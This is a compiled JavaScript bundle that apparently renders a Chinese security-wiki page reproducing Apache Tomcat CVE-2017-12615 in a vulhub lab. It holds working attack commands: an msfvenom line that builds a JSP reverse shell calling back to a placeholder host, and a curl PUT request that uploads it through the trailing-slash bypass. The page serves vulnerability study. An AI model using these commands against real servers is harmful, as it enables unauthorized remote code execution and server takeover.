(window.webpackJsonp=window.webpackJsonp||[]).push([[281],{2739:function(a,s,e){a.exports=e.p+"assets/img/291a35c3-469d-48b6-a65d-92270dfe6024.eeb98650.png"},2740:function(a,s,e){a.exports=e.p+"assets/img/a963d85c-3514-490e-905f-1b6193c75adf.e2ae8cb4.png"},3429:function(a,s,e){"use strict";e.r(s);var t=e(64),r=Object(t.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h1",{attrs:{id:"apache-tomcat-远程代码执行漏洞-cve-2017-12615"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#apache-tomcat-远程代码执行漏洞-cve-2017-12615"}},[a._v("#")]),a._v(" Apache Tomcat 远程代码执行漏洞 CVE-2017-12615")]),a._v(" "),s("h2",{attrs:{id:"漏洞描述"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[a._v("#")]),a._v(" 漏洞描述")]),a._v(" "),s("p",[a._v("2017年9月19日，Apache Tomcat官方确认并修复了两个高危漏洞，其中就有远程代码执行漏洞(CVE-2017-12615)。当 启用了HTTP PUT请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求数据包向服务器上传包含任意代码的 JSP 文件，JSP文件中的恶意代码将能被服务器执行。导致服务器上的数据泄露或获取服务器权限。")]),a._v(" "),s("h2",{attrs:{id:"影响版本"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#影响版本"}},[a._v("#")]),a._v(" 影响版本")]),a._v(" "),s("a-checkbox",{attrs:{checked:""}},[a._v("Apache Tomcat 7.0.0 - 7.0.81")]),s("br"),a._v(" "),s("h2",{attrs:{id:"环境搭建"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#环境搭建"}},[a._v("#")]),a._v(" 环境搭建")]),a._v(" "),s("div",{staticClass:"language-shell line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("git")]),a._v(" clone https://github.com/vulhub/vulhub.git\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("cd")]),a._v(" vulhub/tomcat/CVE-2017-12615\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("docker-compose")]),a._v(" up "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-d")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br")])]),s("p",[s("img",{attrs:{src:e(733),alt:"cbe1eedd-5a2a-4147-b44c-d2789769015f"}})]),a._v(" "),s("h2",{attrs:{id:"漏洞复现"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[a._v("#")]),a._v(" 漏洞复现")]),a._v(" "),s("p",[a._v("漏洞产生的主要原因来自于"),s("code",[a._v("conf/web.xml")]),a._v("文件配置错误,readonly开启了false,导致可以使用"),s("code",[a._v("PUT/DELETE")]),a._v("请求方法操作文件")]),a._v(" "),s("p",[s("img",{attrs:{src:e(2739),alt:"291a35c3-469d-48b6-a65d-92270dfe6024"}})]),a._v(" "),s("p",[s("code",[a._v("msf")]),a._v("生成一个"),s("code",[a._v("jsp")]),a._v("木马")]),a._v(" "),s("div",{staticClass:"language-shell line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[a._v("msfvenom "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" java/jsp_shell_reverse_tcp "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LHOST")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),a._v("xxx.xxx.xxx.xxx "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("LPORT")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("9999")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-f")]),a._v(" raw "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" shell.jsp\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("利用PUT方法上传木马")]),a._v(" "),s("div",{staticClass:"language-shell line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-shell"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("curl")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-v")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-X")]),a._v(" PUT --data-binary @shell.jsp "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"http://xxx.xxx.xxx.xxx:8080/shell.jsp/"')]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("a-alert",{attrs:{type:"success",message:'注意 http://xxx.xxx.xxx.xxx:8080/shell.jsp/中的最后一个"/"字符很重要',description:"",showIcon:""}}),a._v(" "),s("br"),a._v(" "),s("p",[a._v("成功上传木马文件")]),a._v(" "),s("p",[s("img",{attrs:{src:e(2740),alt:"a963d85c-3514-490e-905f-1b6193c75adf"}})]),a._v(" "),s("p",[a._v("访问文件即可反弹一个"),s("code",[a._v("shell")])])],1)}),[],!1,null,null,null);s.default=r.exports},733:function(a,s,e){a.exports=e.p+"assets/img/cbe1eedd-5a2a-4147-b44c-d2789769015f.71f76f8f.png"}}]);